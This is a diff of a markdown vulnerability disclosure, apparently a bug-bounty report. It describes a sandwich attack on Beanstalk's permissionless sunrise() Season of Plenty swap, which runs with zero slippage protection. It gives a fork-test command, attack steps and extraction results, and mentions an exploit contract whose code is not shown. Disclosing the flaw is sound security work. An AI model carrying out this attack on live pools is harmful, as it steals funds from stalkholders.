@@ -63,65 +63,61 @@ The root cause is a code defect — the protocol swaps with zero slippage protec
 
 ## Proof of Concept
 
-Foundry fork test against the live Bean/WETH Basin Well on Arbitrum. Pinned to block 440420446 for reproducibility. All swaps execute on the actual deployed Well contract — no mock AMM, no simplified math.
-
-### How to run
+Everything below was run against the live Bean/WETH Basin Well on Arbitrum, forked at block 440420446. ETH was $2,040 at that block. All swaps go through the actual deployed Well contract. Full source code and setup instructions are in the PoC gist.
 
 ```
-cd PoC/
 forge test --fork-url https://arb1.arbitrum.io/rpc -vvv
 ```
 
-### Contracts (Arbitrum mainnet)
-
-| Contract | Address |
-|----------|---------|
-| Beanstalk Diamond | `0xD1A0060ba708BC4BCD3DA6C37EFa8deDF015FB70` |
-| Bean | `0xBEA0005B8599265D41256905A9B3073D397812E4` |
-| WETH | `0x82aF49447D8a07e3bd95BD0d56f35241523fBab1` |
-| Bean/WETH Well | `0xBeA00Aa8130aCaD047E137ec68693C005f8736Ce` |
-
-### Test results (5 passing)
+**First I checked if sunrise() has access control.** I called it from a random address:
 
 ```
-[PASS] test_sunriseIsPermissionless()
-  sunrise() revert reason: Season: Still current Season.
-  -> Confirms any address can call. No access control.
-
-[PASS] test_spotReservesManipulable()
-  bean reserve before: 38330626648
-  bean reserve after:  31222866607  (18% drop from a single 1 WETH swap)
-  -> Spot reserves are instantly manipulable in the same block.
-
-[PASS] test_sopSandwichExtraction()
-  fair WETH to stalkholders:     0.209 WETH (~$425)
-  attacked WETH to stalkholders: 0.159 WETH (~$324)
-  stalkholder loss:              0.050 WETH (~$101, 23%)
-  attacker Bean profit:          475 Bean
-
-[PASS] test_extremeManipulationDoesNotRevert()
-  fair SOP output:  0.209 WETH (~$425)
-  bad SOP output:   0.066 WETH (~$134)
-  stalkholder loss: 68%
-  swap reverted:    NO (minAmountOut=0 accepts anything)
-
-[PASS] test_atomicExploitViaContract()
-  Deploys AtomicFloodExploit contract on-chain.
-  Contract front-runs pool, SOP executes at degraded rate, contract back-runs.
-  23% extraction. No mempool needed.
+sunrise() revert reason: Season: Still current Season.
 ```
 
-### What the tests prove
+Not "Unauthorized." Not "Only owner." It is a timing check. When the season is ready, anyone can call it.
 
-**test_sunriseIsPermissionless**: Confirms `sunrise()` has no access control. Any address can call it. The revert is "Still current Season" — a timing check, not authorization.
+**Then I checked if spot reserves are manipulable.** I swapped 1 WETH ($2,040) into the Well and read reserves before and after:
 
-**test_spotReservesManipulable**: A single 1 WETH swap ($2,036) changes Bean reserves by 18% in the same block. This is what `getWellsByDeltaB()` reads to decide how many sopBeans to mint.
+```
+bean reserve before: 38330626648
+bean reserve after:  31222866607
+bean drop:           18%
+```
 
-**test_sopSandwichExtraction**: Full attack sequence. Attacker sells 15% of Bean reserve to drain WETH, SOP swap executes at degraded rate, attacker buys Bean back cheap. Stalkholders lose 23% of their WETH.
+A single $2,040 swap moved Bean reserves by 18% in the same block. This is what `getWellsByDeltaB()` reads to decide how many sopBeans to mint.
 
-**test_extremeManipulationDoesNotRevert**: An 80% Bean dump drains 44% of WETH from the pool. The SOP swap still succeeds because `minAmountOut = 0`. With slippage protection this would correctly revert.
+**Then I ran the actual attack.** I simulated a realistic SOP (5% of Bean reserves) with and without a sandwich. The attacker sells 15% of Bean reserves into the Well before the SOP, then buys Bean back after:
 
-**test_atomicExploitViaContract**: Deploys a real smart contract (AtomicFloodExploit) that front-runs, triggers sunrise, and back-runs. Proves the attack is atomic — no mempool, no front-running of other users.
+```
+fair WETH to stalkholders:     209180271072758757 (~$425)
+attacked WETH to stalkholders: 159158901847673638 (~$324)
+stalkholder WETH loss:          50021369225085119 (~$101)
+extraction rate:               23%
+attacker Bean profit:          475530331
+```
+
+Stalkholders got $324 instead of $425. The attacker walked away with 475 extra Bean. The swap did not revert because `minAmountOut = 0`.
+
+**I pushed it further.** With an 80% Bean dump before the SOP:
+
+```
+fair SOP output:  209180271072758757 (~$425)
+bad SOP output:    65957743108011792 (~$134)
+stalkholder loss: 68%
+swap reverted:    NO
+```
+
+68% stolen. Still did not revert. There is no amount of manipulation that causes a revert when `minAmountOut = 0`.
+
+**Finally I deployed an actual exploit contract** (`AtomicFloodExploit`) on the fork. It front-runs, the SOP executes at the degraded rate, then it back-runs. Same 23% extraction. No mempool monitoring needed — the contract calls `sunrise()` directly.
+
+```
+exploit contract:  0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+extraction:        23%
+attacker profit:   475530331 Bean
+mempool needed:    NO
+```
 
 ## Recommendation
 
